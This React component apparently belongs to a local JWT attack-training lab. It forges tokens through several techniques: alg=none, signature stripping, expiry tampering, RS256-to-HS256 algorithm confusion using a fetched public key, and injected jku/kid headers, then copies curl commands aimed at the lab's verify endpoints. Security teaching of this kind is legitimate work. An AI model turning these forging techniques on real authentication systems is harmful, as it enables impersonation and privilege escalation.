import { useState, useEffect, useCallback, useRef, useMemo } from 'react'
import { SignJWT, importJWK, importPKCS8 } from 'jose'

const WEAK_SECRETS = new Set(['secret', 'password', '1234', '123456', 'admin', 'test', 'abc123'])
const ALGORITHMS = ['HS256', 'HS384', 'HS512', 'RS256', 'none']

const ALGORITHM_TOOLTIPS: Record<string, string> = {
  HS256: 'HMAC-SHA256 — symmetric: same secret signs and verifies. Fast but requires sharing the secret. Vulnerable to offline brute-force if secret is weak.',
  HS384: 'HMAC-SHA384 — symmetric HMAC with a 384-bit hash. Marginally stronger than HS256; same pitfalls apply (shared secret, brute-forceable if weak).',
  HS512: 'HMAC-SHA512 — symmetric HMAC with a 512-bit hash. Strongest of the HS* family; shared-secret pitfall still applies.',
  RS256: 'RSA-SHA256 — asymmetric: private key signs, public key verifies. No shared secret; public key can be freely distributed. Vulnerable to algorithm confusion attacks if alg header is trusted.',
  none: 'No algorithm — no signature is produced or verified. RFC 7518 §3.6. NEVER accept in production: any bearer can forge claims without a secret.',
}

// Relative exp picker presets
const EXP_PRESETS = [
  { label: 'Custom / No change', value: '' },
  { label: '+15 minutes',        value: '+15m' },
  { label: '+1 hour',            value: '+1h' },
  { label: '+24 hours',          value: '+24h' },
  { label: 'Expired 5 min ago',  value: '-5m' },
  { label: 'Expired 1 hour ago', value: '-1h' },
]

function resolveExp(preset: string): number | null {
  if (!preset) return null
  const now = Math.floor(Date.now() / 1000)
  const sign = preset[0] === '+' ? 1 : -1
  const num = parseInt(preset.slice(1), 10)
  const unit = preset.slice(-1)
  const secs = unit === 'h' ? num * 3600 : num * 60
  return now + sign * secs
}

function b64url(obj: unknown): string {
  const json = typeof obj === 'string' ? obj : JSON.stringify(obj)
  return btoa(unescape(encodeURIComponent(json)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
}

/** Minimal JSON syntax highlighter — returns an array of {text, type} tokens. */
function tokenizeJson(src: string): { text: string; type: 'key' | 'string' | 'number' | 'boolean' | 'null' | 'punct' | 'plain' }[] {
  const tokens: { text: string; type: 'key' | 'string' | 'number' | 'boolean' | 'null' | 'punct' | 'plain' }[] = []
  const re = /("(?:[^"\\]|\\.)*")\s*:|("(?:[^"\\]|\\.)*")|(-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)|(\btrue\b|\bfalse\b)|(\bnull\b)|([\[\]{},:])|(\s+)|(.)/g
  let m: RegExpExecArray | null
  while ((m = re.exec(src)) !== null) {
    if (m[1])      tokens.push({ text: m[0], type: 'key' })
    else if (m[2]) tokens.push({ text: m[2], type: 'string' })
    else if (m[3]) tokens.push({ text: m[3], type: 'number' })
    else if (m[4]) tokens.push({ text: m[4], type: 'boolean' })
    else if (m[5]) tokens.push({ text: m[5], type: 'null' })
    else if (m[6]) tokens.push({ text: m[6], type: 'punct' })
    else           tokens.push({ text: m[0], type: 'plain' })
  }
  return tokens
}

const JSON_TOKEN_COLORS: Record<string, string> = {
  key:     'text-jwt-header',      // blue — keys
  string:  'text-jwt-payload',     // green — string values
  number:  'text-warning',         // amber — numbers
  boolean: 'text-primary',         // teal — true/false
  null:    'text-text-muted',      // muted — null
  punct:   'text-text-muted',      // muted — {, }, [, ], :, ,
  plain:   'text-text-primary',
}

function JsonHighlight({ src }: { src: string }) {
  try {
    JSON.parse(src)  // only highlight valid JSON
  } catch {
    return <span className="text-text-primary">{src}</span>
  }
  const tokens = tokenizeJson(src)
  return (
    <>
      {tokens.map((t, i) => (
        <span key={i} className={JSON_TOKEN_COLORS[t.type] ?? 'text-text-primary'}>
          {t.text}
        </span>
      ))}
    </>
  )
}

/** Sign a JWT using jose (HS256/HS384/HS512/RS256) or build an alg=none token. */
async function signToken(
  algorithm: string,
  payloadText: string,
  secretOrKey: string,
  customHeader: Record<string, unknown>,
): Promise<string> {
  let payload: Record<string, unknown>
  try {
    payload = JSON.parse(payloadText)
  } catch {
    throw new Error('Invalid JSON payload')
  }

  if (algorithm === 'none') {
    const header = { alg: 'none', typ: 'JWT', ...customHeader }
    return `${b64url(header)}.${b64url(payload)}.`
  }

  if (algorithm.startsWith('HS')) {
    if (!secretOrKey) throw new Error('Enter an HMAC secret to sign')
    const hashBits = algorithm.slice(2)           // '256', '384', '512'
    const hashName = `SHA-${hashBits}`
    const enc = new TextEncoder()

    // Use full UTF-8 bytes of secretOrKey as HMAC key material.
    // For alg-confusion attacks the full PEM string (including armor headers) is passed —
    // this matches the server which signs with the raw public_key_pem bytes.
    const key = await crypto.subtle.importKey(
      'raw', enc.encode(secretOrKey),
      { name: 'HMAC', hash: hashName }, false, ['sign']
    )

    const header = { alg: algorithm, typ: 'JWT', ...customHeader }
    const signingInput = `${b64url(header)}.${b64url(payload)}`
    const sigBytes = await crypto.subtle.sign('HMAC', key, enc.encode(signingInput))
    const sig = btoa(String.fromCharCode(...new Uint8Array(sigBytes)))
      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
    return `${signingInput}.${sig}`
  }

  if (algorithm === 'RS256') {
    if (!secretOrKey.trim()) throw new Error('Paste an RSA private key PEM to sign RS256')
    try {
      const privateKey = await importPKCS8(secretOrKey.trim(), 'RS256')
      const customHdr = { ...customHeader }
      const jwt = await new SignJWT({ ...payload })
        .setProtectedHeader({ alg: 'RS256', typ: 'JWT', ...customHdr })
        .sign(privateKey)
      return jwt
    } catch (e) {
      // Try as JWK
      try {
        const jwkObj = JSON.parse(secretOrKey.trim())
        const privateKey = await importJWK(jwkObj, 'RS256')
        const customHdr = { ...customHeader }
        const jwt = await new SignJWT({ ...payload })
          .setProtectedHeader({ alg: 'RS256', typ: 'JWT', ...customHdr })
          .sign(privateKey)
        return jwt
      } catch {
        throw new Error(`RS256 signing failed: ${(e as Error).message}`)
      }
    }
  }

  throw new Error(`Unsupported algorithm: ${algorithm}`)
}

interface Props {
  initialToken?: string
  onTokenChange?: (token: string) => void
  defaultMutation?: string
  extraHeaderFields?: Record<string, unknown>   // caller-injected extra header fields (e.g. jku, kid)
  slug?: string             // used to construct the correct verify URL in the curl command
  initialSecret?: string    // pre-fill the HMAC secret field (e.g. cracked secret)
}

export default function JWTForge({ initialToken, onTokenChange, defaultMutation, extraHeaderFields, slug, initialSecret }: Props) {
  const [algorithm, setAlgorithm] = useState('HS256')
  const [secret, setSecret] = useState(initialSecret ?? '')
  const [payloadText, setPayloadText] = useState('{\n  "sub": "1",\n  "role": "user"\n}')
  const [expPreset, setExpPreset] = useState('')
  const [encodedToken, setEncodedToken] = useState('')
  const [payloadError, setPayloadError] = useState(false)
  const [signingError, setSigningError] = useState('')
  const [copiedToken, setCopiedToken] = useState(false)
  const [copiedCurl, setCopiedCurl] = useState(false)
  const signTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const mutationAppliedRef = useRef(false)

  // Serialize a header field value for storage in the editable string state.
  // Non-primitive values (e.g. a JWK object) are JSON-serialized so round-trip works correctly.
  const serializeHeaderValue = (v: unknown): string =>
    typeof v === 'object' && v !== null ? JSON.stringify(v) : String(v)

  // Editable copy of extra header fields — user can modify values in the UI
  const [customHeaderEdits, setCustomHeaderEdits] = useState<[string, string][]>(
    () => Object.entries(extraHeaderFields ?? {}).map(([k, v]) => [k, serializeHeaderValue(v)])
  )

  // Re-seed customHeaderEdits when the prop changes (e.g. jku URL arrives after key generation)
  useEffect(() => {
    setCustomHeaderEdits(
      Object.entries(extraHeaderFields ?? {}).map(([k, v]) => [k, serializeHeaderValue(v)])
    )
  }, [extraHeaderFields]) // eslint-disable-line react-hooks/exhaustive-deps

  // Derived header record from the editable state.
  // Values that are valid JSON are parsed back to their native type (e.g. JWK objects),
  // so the JWT protected header receives a real object rather than a serialized string.
  const customHeaderRecord = useMemo<Record<string, unknown>>(
    () => Object.fromEntries(
      customHeaderEdits
        .filter(([k]) => k.trim())
        .map(([k, v]) => {
          let parsed: unknown = v
          try { parsed = JSON.parse(v) } catch { /* keep as string */ }
          return [k.trim(), parsed]
        })
    ),
    [customHeaderEdits]
  )

  // When a new initialSecret is passed (e.g. after cracking), update the secret field
  useEffect(() => {
    if (initialSecret) setSecret(initialSecret)
  }, [initialSecret])

  // Seed from initial token; apply defaultMutation after token is decoded
  useEffect(() => {
    if (initialToken) {
      setEncodedToken(initialToken)
      try {
        const parts = initialToken.split('.')
        if (parts.length === 3) {
          const pad = (s: string) => s + '=='.slice(0, (4 - s.length % 4) % 4)
          const header = JSON.parse(atob(pad(parts[0].replace(/-/g, '+').replace(/_/g, '/'))))
          const payload = JSON.parse(atob(pad(parts[1].replace(/-/g, '+').replace(/_/g, '/'))))
          setAlgorithm(header.alg ?? 'HS256')
          setPayloadText(JSON.stringify(payload, null, 2))
        }
      } catch {}
      // Apply defaultMutation once after the first real token arrives
      if (defaultMutation && !mutationAppliedRef.current) {
        mutationAppliedRef.current = true
        // Defer one tick so state setters above have time to batch
        setTimeout(() => applyMutation(defaultMutation), 0)
      }
    }
  }, [initialToken]) // eslint-disable-line react-hooks/exhaustive-deps

  const rebuildAndSign = useCallback(async (
    alg: string, payText: string, sec: string, expPre: string,
    extraHdr: Record<string, unknown> | undefined
  ) => {
    let finalPayText = payText
    // Apply exp preset
    if (expPre) {
      try {
        const p = JSON.parse(payText)
        const expVal = resolveExp(expPre)
        if (expVal !== null) {
          p.exp = expVal
          finalPayText = JSON.stringify(p, null, 2)
          setPayloadText(finalPayText)
        }
      } catch {}
    }

    try {
      JSON.parse(finalPayText)
      setPayloadError(false)
    } catch {
      setPayloadError(true)
      return
    }

    try {
      const token = await signToken(alg, finalPayText, sec, extraHdr ?? {})
      setEncodedToken(token)
      setSigningError('')
      onTokenChange?.(token)
    } catch (e) {
      // If signing fails (e.g. empty secret for HS256), show an unsigned preview
      setSigningError((e as Error).message)
      try {
        const headerObj = { alg, typ: 'JWT', ...(extraHdr ?? {}) }
        const payObj = JSON.parse(finalPayText)
        const preview = `${b64url(headerObj)}.${b64url(payObj)}.<unsigned>`
        setEncodedToken(preview)
        onTokenChange?.(preview)
      } catch {}
    }
  }, [onTokenChange])

  // Debounced re-sign on any input change (use customHeaderRecord so UI edits are reflected)
  useEffect(() => {
    if (signTimerRef.current) clearTimeout(signTimerRef.current)
    signTimerRef.current = setTimeout(() => {
      rebuildAndSign(algorithm, payloadText, secret, expPreset, customHeaderRecord)
    }, 200)
    return () => { if (signTimerRef.current) clearTimeout(signTimerRef.current) }
  }, [algorithm, payloadText, secret, expPreset, customHeaderRecord, rebuildAndSign])

  // Mutation shortcuts
  const applyMutation = useCallback((mutation: string) => {
    switch (mutation) {
      case 'alg-none':
        setAlgorithm('none')
        break
      case 'strip-signature':
        setEncodedToken(prev => {
          const parts = prev.split('.')
          const stripped = `${parts[0]}.${parts[1]}.`
          onTokenChange?.(stripped)
          return stripped
        })
        break
      case 'set-exp-past':
        try {
          const p = JSON.parse(payloadText)
          p.exp = Math.floor(Date.now() / 1000) - 300
          setPayloadText(JSON.stringify(p, null, 2))
        } catch {}
        break
      case 'set-exp-future':
        try {
          const p = JSON.parse(payloadText)
          p.exp = Math.floor(Date.now() / 1000) + 3600
          setPayloadText(JSON.stringify(p, null, 2))
        } catch {}
        break
      case 'flip-hs256-embedded':
        setAlgorithm('HS256')
        // Fetch the server's RS256 public key PEM and use it as the HMAC secret (alg-confusion)
        fetch('/api/v1/attack/alg-confusion/public-key')
          .then(r => { if (!r.ok) throw new Error(`Server returned ${r.status}`); return r.json() })
          .then(d => { if (d.publicKeyPem) { setSecret(d.publicKeyPem); setSigningError('') } })
          .catch((e: unknown) => { setSigningError(`Failed to fetch public key: ${(e as Error).message}`) })
        break
    }
  }, [payloadText, onTokenChange])

  const copyToken = () => {
    const tokenToCopy = encodedToken.endsWith('.<unsigned>')
      ? encodedToken.slice(0, encodedToken.lastIndexOf('.') + 1)
      : encodedToken
    navigator.clipboard.writeText(tokenToCopy)
    setCopiedToken(true)
    setTimeout(() => setCopiedToken(false), 2000)
  }

  const copyCurl = () => {
    const endpoint = slug
      ? `http://localhost:8765/api/v1/attack/${slug}/verify`
      : 'http://localhost:8765/api/v1/attack/verify'
    const cmd = `curl -X POST ${endpoint} \\\n  -H 'Content-Type: application/json' \\\n  -H 'Authorization: Bearer ${encodedToken}' \\\n  -d '{"token":"${encodedToken}"}'`
    navigator.clipboard.writeText(cmd)
    setCopiedCurl(true)
    setTimeout(() => setCopiedCurl(false), 2000)
  }

  const isWeakSecret = algorithm.startsWith('HS') && WEAK_SECRETS.has(secret.toLowerCase())
  const isPemSecret = algorithm.startsWith('HS') && secret.includes('-----BEGIN')
  const secretStrength = secret.length === 0 ? 0 : secret.length < 8 ? 1 : secret.length < 20 ? 2 : 3

  // Color-code the JWT segments
  const tokenDisplay = encodedToken.replace('.<unsigned>', '.')
  const segments = tokenDisplay.split('.')

  return (
    <div className="space-y-3">
      {/* Algorithm selector */}
      <div>
        <label className="text-small text-text-muted block mb-1">Algorithm</label>
        <select
          value={algorithm}
          onChange={e => setAlgorithm(e.target.value)}
          className="input-field w-full"
          aria-label="JWT algorithm"
        >
          {ALGORITHMS.map(a => (
            <option key={a} value={a} title={ALGORITHM_TOOLTIPS[a]}>{a}</option>
          ))}
        </select>
      </div>

      {/* Secret / key input */}
      {algorithm !== 'none' && (
        <div>
          <label className="text-small text-text-muted block mb-1">
            {algorithm === 'RS256' ? 'RSA Private Key (PEM or JWK)' : 'HMAC Secret'}
          </label>
          {algorithm === 'RS256' ? (
            <textarea
              value={secret}
              onChange={e => setSecret(e.target.value)}
              placeholder="Paste RSA private key PEM or JWK JSON…"
              className="input-field w-full h-24 resize-none font-mono text-xs"
              aria-label="RSA private key"
            />
          ) : (
            <>
              <input
                type="text"
                value={secret}
                onChange={e => setSecret(e.target.value)}
                placeholder="Enter HMAC secret (or paste PEM for alg-confusion)…"
                className="input-field w-full"
                aria-label="HMAC secret"
              />
              {/* Strength indicator */}
              <div className="flex items-center gap-2 mt-1 flex-wrap">
                <div className="flex gap-1">
                  {[1,2,3].map(i => (
                    <div key={i} className={`h-1 w-6 rounded-full transition-colors ${
                      i <= secretStrength ? (secretStrength === 3 ? 'bg-primary' : secretStrength === 2 ? 'bg-warning' : 'bg-error') : 'bg-border'
                    }`} />
                  ))}
                </div>
                {isWeakSecret && (
                  <span className="badge-warning text-xs">⚠ Weak / Common Secret</span>
                )}
                {isPemSecret && (
                  <span className="badge-warning text-xs" title="You are using a PEM public key as an HMAC secret — this is the algorithm confusion attack pattern">
                    ⚠ PEM as HMAC secret — algorithm confusion pattern
                  </span>
                )}
              </div>
            </>
          )}
        </div>
      )}

      {/* Payload editor with syntax-highlighted preview */}
      <div>
        <label className="text-small text-text-muted block mb-1">Payload (JSON)</label>
        <textarea
          value={payloadText}
          onChange={e => setPayloadText(e.target.value)}
          className={`input-field w-full h-28 resize-none font-mono text-small ${payloadError ? 'border-error' : ''}`}
          aria-label="JWT payload JSON editor"
          aria-invalid={payloadError}
          spellCheck={false}
        />
        {payloadError && <p className="text-error text-xs mt-1">Invalid JSON</p>}
        {/* Syntax-highlighted preview (read-only) */}
        {!payloadError && (
          <pre
            className="mt-1 code-block text-xs font-mono whitespace-pre-wrap max-h-28 overflow-y-auto"
            aria-label="Syntax-highlighted JSON preview"
          >
            <JsonHighlight src={payloadText} />
          </pre>
        )}
      </div>

      {/* Editable custom header fields (e.g. kid, jku injected by parent module) */}
      {customHeaderEdits.length > 0 && (
        <div>
          <label className="text-small text-text-muted block mb-1">Custom Header Fields</label>
          <div className="space-y-1">
            {customHeaderEdits.map(([key, value], idx) => (
              <div key={key} className="flex gap-2 items-center">
                <span className="font-mono text-xs text-text-muted w-16 shrink-0 truncate" title={key}>{key}</span>
                <span className="text-text-muted text-xs">:</span>
                <input
                  type="text"
                  value={value}
                  onChange={e => setCustomHeaderEdits(prev =>
                    prev.map((pair, i) => i === idx ? [pair[0], e.target.value] : pair)
                  )}
                  className="input-field flex-1 text-xs font-mono"
                  aria-label={`Header field ${key} value`}
                />
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Relative exp picker */}
      <div>
        <label className="text-small text-text-muted block mb-1">Set exp (relative)</label>
        <select
          value={expPreset}
          onChange={e => setExpPreset(e.target.value)}
          className="input-field w-full"
          aria-label="Relative expiration picker"
        >
          {EXP_PRESETS.map(p => (
            <option key={p.value} value={p.value}>{p.label}</option>
          ))}
        </select>
      </div>

      {/* Mutation shortcuts */}
      <div>
        <div className="text-small text-text-muted mb-1">Mutation Shortcuts</div>
        <div className="flex flex-wrap gap-2">
          <button onClick={() => applyMutation('alg-none')}          className="btn-secondary py-1 h-7 px-2 text-xs">Set alg to none</button>
          <button onClick={() => applyMutation('strip-signature')}   className="btn-secondary py-1 h-7 px-2 text-xs">Strip Signature</button>
          <button onClick={() => applyMutation('set-exp-past')}      className="btn-secondary py-1 h-7 px-2 text-xs">Set exp to past</button>
          <button onClick={() => applyMutation('flip-hs256-embedded')} className="btn-secondary py-1 h-7 px-2 text-xs">Flip to HS256 (pubkey)</button>
        </div>
      </div>

      {/* Signing error */}
      {signingError && (
        <p className="text-warning text-xs bg-warning/10 border border-warning/30 rounded px-2 py-1">
          ⚠ {signingError}
        </p>
      )}

      {/* Encoded preview */}
      <div>
        <div className="text-small text-text-muted mb-1">
          Encoded Token Preview
          {!signingError && algorithm !== 'none' && secret && (
            <span className="ml-2 text-primary text-xs">✓ signed</span>
          )}
        </div>
        <div className="code-block break-all text-xs">
          {segments.map((seg, i) => (
            <span key={i} className={[
              'jwt-header-color',
              'jwt-payload-color',
              'jwt-sig-color',
            ][i] ?? 'text-text-muted'}>
              {seg}
              {i < 2 && <span className="text-text-muted">.</span>}
            </span>
          ))}
        </div>
      </div>

      {/* Export buttons */}
      <div className="flex gap-2">
        <button onClick={copyToken} className="btn-secondary py-1 h-7 px-2 text-xs flex-1">
          {copiedToken ? '✓ Copied' : 'Copy Token'}
        </button>
        <button onClick={copyCurl} className="btn-secondary py-1 h-7 px-2 text-xs flex-1">
          {copiedCurl ? '✓ Copied' : 'Copy curl'}
        </button>
      </div>
    </div>
  )
}
